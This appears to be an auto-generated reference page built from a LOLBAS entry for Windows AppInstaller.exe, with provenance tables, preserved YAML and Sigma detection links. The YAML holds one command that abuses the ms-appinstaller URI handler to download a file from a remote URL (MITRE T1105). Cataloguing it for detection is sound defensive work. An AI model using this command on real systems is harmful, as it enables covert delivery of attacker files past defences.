---
parsed_by: focuslocust
source: lolbas
type: generated
---
# AppInstaller.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `appinstaller.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/AppInstaller.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AppInstaller.exe](../../tools/windows/appinstaller.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | appinstaller.exe |
| name | AppInstaller.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/notwhickey/status/1333900137232523264 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@notwhickey'
  Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Download
  Command: start ms-appinstaller://?source={REMOTEURL:.exe}
  Description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from
    the URL and is saved in INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from Internet
Created: 2020-12-02
Description: Tool used for installation of AppX/MSIX applications on Windows 10
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
Full_Path:
- Path: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe
Name: AppInstaller.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1333900137232523264
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/AppInstaller.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
```
